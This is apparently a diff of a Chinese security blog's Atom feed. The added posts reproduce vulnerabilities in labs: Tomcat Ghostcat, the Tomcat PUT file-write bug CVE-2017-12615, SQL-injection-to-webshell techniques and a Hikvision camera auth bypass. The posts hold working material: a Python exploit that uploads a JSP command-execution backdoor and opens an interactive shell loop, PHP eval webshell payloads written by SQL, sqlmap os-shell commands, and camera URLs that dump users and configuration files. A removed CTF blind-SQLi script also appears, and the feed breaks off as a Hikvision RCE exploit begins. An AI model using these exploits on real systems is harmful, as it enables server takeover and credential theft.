+<p>构造发送AJP包的命令，[ip] [port] 为目标机器的ip和端口号，/WEB-INF/ma.png为上传的木马路径，11.jsp 可换做 *.jsp，任意网站目录下不存在的jsp文件，这样tomcat才会去调用DefaultServlet</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>forwardrequest 2 "HTTP/1.1" "/11.jsp" [ip] [ip] porto 8009 false "Cookie:AAAA=BBBB","Accept-Encoding:identity" "javax.servlet.include.request_uri:11.jsp","javax.servlet.include.path_info:/WEB-INF/ma.png","javax.servlet.include.servlet_path:/"
+</code></pre></div></div>
+
+<p><img src="/images/vulhub/CVE-2020-1938/4.jpg" alt="" /></p>
+
+<p>发送ajp请求后，ma.png文件被tomcat作为jsp文件解析，成功getshell</p>
+
+<p><img src="/images/vulhub/CVE-2020-1938/5.jpg" alt="" /></p>
+
+<h2 id="0x05-参考">0x05 参考</h2>
+<p>https://www.chaitin.cn/zh/ghostcat</p>
+
+<p>https://mp.weixin.qq.com/s?__biz=MzUyNDk0MDQ3OQ==&amp;mid=2247485009&amp;idx=1&amp;sn=5f619c27ec994949f5fa69d41d2dee05&amp;chksm=fa24e381cd536a972db2cc5a5fc09be33a7833f1caa6440bb5979d3d7ea052384645fbd2b62c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1584439554350&amp;sharer_shareid=1f92b9e8670fffeb7eea157894e3536a#rd</p>]]></content><author><name>yueyejian</name></author><category term="[&quot;vulhub&quot;]" /><category term="tomcat" /><category term="web" /><category term="ajp" /><category term="lfi" /><summary type="html"><![CDATA[CVE-2020-1938 - Ghostcat 0x00 漏洞概述 Java 是目前 Web 开发中主流的编程语言，而 Tomcat 是当前流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。]]></summary></entry><entry><title type="html">CVE-2017-12615 - Tomcat任意文件写入</title><link href="http://localhost:4000/vulhub/CVE-2017-12615/" rel="alternate" type="text/html" title="CVE-2017-12615 - Tomcat任意文件写入" /><published>2023-04-15T00:00:00+08:00</published><updated>2023-04-15T00:00:00+08:00</updated><id>http://localhost:4000/vulhub/CVE-2017-12615</id><content type="html" xml:base="http://localhost:4000/vulhub/CVE-2017-12615/"><![CDATA[<h1 id="cve-2017-12615---tomcat任意文件写入">CVE-2017-12615 - Tomcat任意文件写入</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<p>用vulhub的环境</p>
+
+<p><img src="/images/vulhub/CVE-2017-12615/0.png" alt="" /></p>
+
+<p><img src="/images/vulhub/CVE-2017-12615/1.png" alt="" /></p>
+
+<p>查看配置文件conf/web.xml中readonly的设置</p>
+
+<p><img src="/images/vulhub/CVE-2017-12615/2.png" alt="" /></p>
+
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>访问主页，抓包后修改数据包</p>
+
+<p><img src="/images/vulhub/CVE-2017-12615/3.png" alt="" /></p>
+
+<p>可通过 PUT 方式创建一个 JSP 文件。虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code class="language-plaintext highlighter-rouge">/</code>）来绕过了限制。</p>
+
+<p>改完包的时候不知道为啥上传失败了，于是我换了buuoj的环境，上传冰蝎的jsp木马，返回201代表上传成功</p>
+
+<p><img src="/images/vulhub/CVE-2017-12615/4.png" alt="" /></p>
+
+<p>再用冰蝎连接即可</p>
+
+<p><img src="/images/vulhub/CVE-2017-12615/5.png" alt="" /></p>
+
+<p>Windows服务器上搭建的tomcat可以在文件尾部加上 %20或者 ::$DATA等绕过</p>
+
+<h2 id="poc--exp">POC &amp;&amp; EXP</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#CVE-2017-12615 POC
+</span><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">optparse</span>
+<span class="kn">import</span> <span class="n">os</span>
+
+<span class="n">parse</span> <span class="o">=</span> <span class="n">optparse</span><span class="p">.</span><span class="nc">OptionParser</span><span class="p">(</span><span class="n">usage</span> <span class="o">=</span> <span class="sh">'</span><span class="s">python3 %prog [-h] [-u URL] [-p PORT] [-f FILE]</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-u</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">--url</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">URL</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target url</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">--port</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">PORT</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target port[default:8080]</span><span class="sh">'</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">8080</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-f</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">FILE</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target list</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">options</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="n">parse</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+<span class="c1">#print(options)
+#验证参数是否完整
+</span><span class="nf">if </span><span class="p">(</span><span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">URL</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">PORT</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port] [-f FILE]</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">(</span><span class="sh">'</span><span class="s">CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">filename</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/hello.jsp</span><span class="sh">'</span>
+
+<span class="c1">#测试数据
+</span><span class="n">data</span> <span class="o">=</span> <span class="sh">'</span><span class="s">hello</span><span class="sh">'</span>
+
+<span class="c1">#提交PUT请求
+#resp = requests.post(url1,headers=headers,data=data)
+</span>
+<span class="c1">#验证文件是否上传成功
+#response = requests.get(url2)
+#上传文件
+</span><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+  <span class="k">try</span><span class="p">:</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">1</span>
+  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] {0} 连接失败</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
+    <span class="k">return</span> <span class="mi">0</span>
+<span class="k">def</span> <span class="nf">checking</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+  <span class="k">try</span><span class="p">:</span>
+    <span class="c1">#验证文件是否上传成功
+</span>    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">filename</span><span class="p">)</span>
+    <span class="c1">#print(url+filename)
+</span>    <span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">and</span> <span class="sh">'</span><span class="s">hello</span><span class="sh">'</span> <span class="ow">in</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+      <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] {0} 存在CVE-2017-12615 Tomcat 任意文件读写漏洞</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+      <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] {0} 不存在CVE-2017-12615 Tomcat 任意文件读写漏洞</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
+  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+                <span class="c1">#print(e)
+</span>    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">[-] {0} 连接失败</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
+<span class="k">if</span> <span class="n">options</span><span class="p">.</span><span class="n">FILE</span> <span class="ow">and</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">):</span>
+  <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">urls</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
+    <span class="c1">#print(urls)
+</span>    <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">urls</span><span class="p">:</span>
+      <span class="n">url</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">url</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">'</span><span class="se">\r</span><span class="sh">'</span><span class="p">,</span> <span class="sh">''</span><span class="p">).</span><span class="nf">strip</span><span class="p">()</span>
+      <span class="k">if</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="nf">checking</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">options</span><span class="p">.</span><span class="n">FILE</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">):</span>
+  <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] {0} 文件不存在</span><span class="sh">'</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">options</span><span class="p">.</span><span class="n">FILE</span><span class="p">))</span>
+<span class="k">else</span><span class="p">:</span>
+  <span class="c1">#上传链接
+</span>  <span class="n">url</span> <span class="o">=</span> <span class="n">options</span><span class="p">.</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="o">+</span><span class="n">options</span><span class="p">.</span><span class="n">PORT</span>
+  <span class="k">if</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="nf">checking</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#CVE-2017-12615 EXP
+</span><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">optparse</span>
 <span class="kn">import</span> <span class="n">time</span>
 
-<span class="n">url</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://d5d88314-27e4-43cf-a7b4-802508698555.node3.buuoj.cn/index.php</span><span class="sh">"</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
-	<span class="sh">"</span><span class="s">id</span><span class="sh">"</span> <span class="p">:</span> <span class="sh">""</span>
-<span class="p">}</span>
-<span class="n">result</span> <span class="o">=</span> <span class="sh">""</span>
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
-	<span class="n">l</span> <span class="o">=</span> <span class="mi">33</span>
-	<span class="n">r</span> <span class="o">=</span><span class="mi">130</span>
-	<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">+</span><span class="n">r</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">1</span>
-	<span class="nf">while</span><span class="p">(</span><span class="n">l</span><span class="o">&lt;</span><span class="n">r</span><span class="p">):</span>
-		<span class="n">payload</span><span class="p">[</span><span class="sh">"</span><span class="s">id</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0^</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1})</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">)</span>
-		<span class="n">html</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
-		<span class="nf">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-		<span class="k">if</span> <span class="sh">"</span><span class="s">Hello</span><span class="sh">"</span> <span class="ow">in</span> <span class="n">html</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
-			<span class="n">l</span> <span class="o">=</span> <span class="n">mid</span><span class="o">+</span><span class="mi">1</span>
-		<span class="k">else</span><span class="p">:</span>
-			<span class="n">r</span> <span class="o">=</span> <span class="n">mid</span>
-		<span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">+</span><span class="n">r</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">1</span>
-	<span class="nf">if</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span><span class="o">==</span><span class="sh">"</span><span class="s"> </span><span class="sh">"</span><span class="p">):</span>
-		<span class="k">break</span>
-	<span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="nf">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
-	<span class="nf">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
-<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">flag: </span><span class="sh">"</span> <span class="p">,</span><span class="n">result</span><span class="p">)</span>
-</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;ctf&quot;]" /><category term="sqli" /><category term="web" /><category term="ctf" /><summary type="html"><![CDATA[0x01 题目描述]]></summary></entry></feed>
+
+<span class="n">parse</span> <span class="o">=</span> <span class="n">optparse</span><span class="p">.</span><span class="nc">OptionParser</span><span class="p">(</span><span class="n">usage</span> <span class="o">=</span> <span class="sh">'</span><span class="s">python3 %prog [-h] [-u URL] [-p PORT]</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-u</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">--url</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">URL</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target url</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">parse</span><span class="p">.</span><span class="nf">add_option</span><span class="p">(</span><span class="sh">'</span><span class="s">-p</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">--port</span><span class="sh">'</span><span class="p">,</span><span class="n">dest</span><span class="o">=</span><span class="sh">'</span><span class="s">PORT</span><span class="sh">'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="sh">'</span><span class="s">target port[default:8080]</span><span class="sh">'</span><span class="p">,</span><span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">8080</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">options</span><span class="p">,</span><span class="n">args</span> <span class="o">=</span> <span class="n">parse</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
+<span class="c1">#验证参数是否完整
+</span><span class="k">if</span> <span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">URL</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">options</span><span class="p">.</span><span class="n">PORT</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">Usage:python3 CVE-2017-12615-POC.py [-u url] [-p port]</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
+        <span class="nf">exit</span><span class="p">(</span><span class="sh">'</span><span class="s">CVE-2017-12615-POC.py:error:missing a mandatory option(-u,-p).Use -h for basic and -hh for advanced help</span><span class="sh">'</span><span class="p">)</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="n">options</span><span class="p">.</span><span class="n">URL</span><span class="o">+</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="o">+</span><span class="n">options</span><span class="p">.</span><span class="n">PORT</span>
+<span class="n">filename</span> <span class="o">=</span> <span class="sh">'</span><span class="s">/backdoor.jsp</span><span class="sh">'</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">filename</span><span class="o">+</span><span class="sh">'</span><span class="s">?pwd=023&amp;i=</span><span class="sh">'</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">User-Agent</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0</span><span class="sh">"</span><span class="p">}</span>
+<span class="c1">#木马
+</span><span class="n">data</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">&lt;%
+    if(</span><span class="sh">"</span><span class="s">023</span><span class="sh">"</span><span class="s">.equals(request.getParameter(</span><span class="sh">"</span><span class="s">pwd</span><span class="sh">"</span><span class="s">))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(</span><span class="sh">"</span><span class="s">i</span><span class="sh">"</span><span class="s">)).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print(</span><span class="sh">"</span><span class="s">&lt;pre&gt;</span><span class="sh">"</span><span class="s">);
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print(</span><span class="sh">"</span><span class="s">&lt;/pre&gt;</span><span class="sh">"</span><span class="s">);
+    }
+
+%&gt;</span><span class="sh">'''</span>
+<span class="c1">#上传木马文件
+</span><span class="k">def</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+  <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[*] 目标地址:</span><span class="sh">'</span><span class="o">+</span><span class="n">url</span><span class="p">)</span>
+  <span class="k">try</span><span class="p">:</span>
+    <span class="n">respond</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>
+    <span class="c1">#print(respond.status_code)
+</span>    <span class="k">if</span> <span class="n">respond</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">201</span> <span class="ow">or</span> <span class="n">respond</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">204</span><span class="p">:</span>
+      <span class="c1">#print('[*] 目标地址:'+url)
+</span>      <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[+] 木马上传成功</span><span class="sh">'</span><span class="p">)</span>
+  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] 上传失败</span><span class="sh">'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="mi">0</span>
+
+<span class="c1">#命令执行
+</span><span class="k">def</span> <span class="nf">attack</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cmd</span><span class="p">):</span>
+  <span class="k">try</span><span class="p">:</span>
+    <span class="n">respond</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">respond</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+      <span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">respond</span><span class="p">.</span><span class="n">text</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;pre&gt;</span><span class="sh">"</span><span class="p">,</span><span class="sh">""</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sh">"</span><span class="s">&lt;/pre&gt;</span><span class="sh">"</span><span class="p">,</span><span class="sh">""</span><span class="p">).</span><span class="nf">strip</span><span class="p">())</span>
+
+  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">[-] 命令执行错误</span><span class="sh">'</span><span class="p">)</span>
+<span class="k">if</span> <span class="nf">upload</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="nf">exit</span><span class="p">()</span>
+<span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">输入执行命令(quit退出):</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+  <span class="n">cmd</span> <span class="o">=</span> <span class="nf">input</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt;&gt;&gt;</span><span class="sh">'</span><span class="p">)</span>
+  <span class="nf">if</span><span class="p">(</span><span class="n">cmd</span> <span class="o">==</span> <span class="sh">'</span><span class="s">quit</span><span class="sh">'</span><span class="p">):</span>
+    <span class="k">break</span>
+  <span class="nf">attack</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">cmd</span><span class="p">)</span>
+</code></pre></div></div>
+<p><img src="/images/vulhub/CVE-2017-12615/6.png" alt="" /></p>
+
+<h2 id="修复建议">修复建议</h2>
+<ul>
+  <li>
+    <p>设置conf/web.xml 文件的 readOnly 值为 Ture</p>
+  </li>
+  <li>
+    <p>禁用 PUT 方法并重启 tomcat 服务（如果禁用 PUT 方法，对于依赖PUT方法的应用，可能导致业务失效。）</p>
+  </li>
+  <li>
+    <p>升级到最新版本</p>
+  </li>
+  <li>
+    <p>使用WAF产品进行防御</p>
+  </li>
+</ul>]]></content><author><name>yueyejian</name></author><category term="[&quot;vulhub&quot;]" /><category term="tomcat" /><category term="web" /><summary type="html"><![CDATA[CVE-2017-12615 - Tomcat任意文件写入 环境搭建 用vulhub的环境]]></summary></entry><entry><title type="html">SQL注入Getshell的几种方式</title><link href="http://localhost:4000/tricks/sqli-getshell/" rel="alternate" type="text/html" title="SQL注入Getshell的几种方式" /><published>2023-03-28T00:00:00+08:00</published><updated>2023-03-28T00:00:00+08:00</updated><id>http://localhost:4000/tricks/sqli-getshell</id><content type="html" xml:base="http://localhost:4000/tricks/sqli-getshell/"><![CDATA[<h1 id="sql注入getshell的几种方式">SQL注入Getshell的几种方式</h1>
+<p>SQL注入不仅阔以导致数据泄露，也有阔能getshell哦</p>
+
+<h2 id="0x01-into-outfile">0x01 into outfile</h2>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="k">show</span> <span class="k">global</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">'%secure%'</span><span class="p">;</span>
+<span class="err">$</span> <span class="k">select</span> <span class="s1">'&lt;?php eval($_POST[yyj]);?&gt;'</span> <span class="k">into</span> <span class="n">outfile</span> <span class="nv">"C/phpstudy/www/shell.php"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>sqlmap <span class="nt">-u</span> xxx <span class="nt">--sql-shell</span>
+<span class="nv">$ </span><span class="k">select</span> @@datadir<span class="p">;</span> <span class="c">#查看文件路径（mysql/data的路径，根目录一般与mysql处于同一目录）</span>
+<span class="nv">$ </span><span class="k">select</span> @@secure_file_priv<span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="0x02-sqlmap-os-shell">0x02 sqlmap –os-shell</h2>
+<p><strong>1.原理</strong>
+–os-shell就是使用udf提权获取webshell。也是通过into outfile向服务器写入两个文件，一个可以直接执行系统命令，另一个可以上传文件。需要知道网站根目录以及数据库dba权限。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sqlmap -u xxx --os-shell
+</code></pre></div></div>
+
+<h2 id="0x03-写日志">0x03 写日志</h2>
+<p>尝试用日志写入木马getshell不需要secure_file_priv没有具体值，但是需要知道网站根目录。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="k">show</span> <span class="k">global</span> <span class="n">variables</span> <span class="k">like</span> <span class="s1">'%general%'</span>  <span class="o">#</span><span class="err">查看日志功能是否开启</span>
+<span class="err">$</span> <span class="k">set</span> <span class="k">global</span> <span class="n">general_log</span> <span class="o">=</span> <span class="s1">'ON'</span> <span class="o">#</span><span class="err">未开启的话设置为</span><span class="k">on</span>
+<span class="err">$</span> <span class="k">set</span> <span class="k">global</span> <span class="n">general_log_file</span> <span class="o">=</span> <span class="s1">'C:/phpStudy1/WWW/yyj.php'</span>
+<span class="err">$</span> <span class="k">select</span> <span class="s1">'&lt;?php @eval($_POST[yyj]); ?&gt;'</span> 
+</code></pre></div></div>]]></content><author><name>yueyejian</name></author><category term="[&quot;tricks&quot;]" /><category term="sqli" /><category term="web" /><category term="mysql" /><summary type="html"><![CDATA[SQL注入Getshell的几种方式 SQL注入不仅阔以导致数据泄露，也有阔能getshell哦]]></summary></entry><entry><title type="html">CVE-2017-7921 - Hikvision摄像头越权访问</title><link href="http://localhost:4000/vul/CVE-2017-7921/" rel="alternate" type="text/html" title="CVE-2017-7921 - Hikvision摄像头越权访问" /><published>2022-07-27T00:00:00+08:00</published><updated>2022-07-27T00:00:00+08:00</updated><id>http://localhost:4000/vul/CVE-2017-7921</id><content type="html" xml:base="http://localhost:4000/vul/CVE-2017-7921/"><![CDATA[<blockquote>
+  <p>body=”laCurrentLanguage” &amp;&amp; country=”CN”</p>
+</blockquote>
+
+<p>查看用户列表</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/Security/users?auth=YWRtaW46MTEK   
+</code></pre></div></div>
+
+<p>获取监控快照</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/onvif-http/snapshot?auth=YWRtaW46MTEK
+</code></pre></div></div>
+<p>下载配置文件</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/System/configurationFile?auth=YWRtaW46MTEK  
+</code></pre></div></div>
+
+<p><strong>解码配置文件</strong></p>
+
+<p><a href="https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor">https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor</a></p>
+
+<p>安装脚本依赖文件</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo python3 -m pip install pycryptodome
+</code></pre></div></div>
+
+<p>解码，可得到用户名和密码</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./decrypt_configurationFile.py &lt;nameofdownloadedconfig&gt;
+</code></pre></div></div>
+
+<p>CVE-2021-36260-HikvisionRCE:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: Hikvision Web Server Build 210702 - Command Injection
+# Exploit Author: bashis
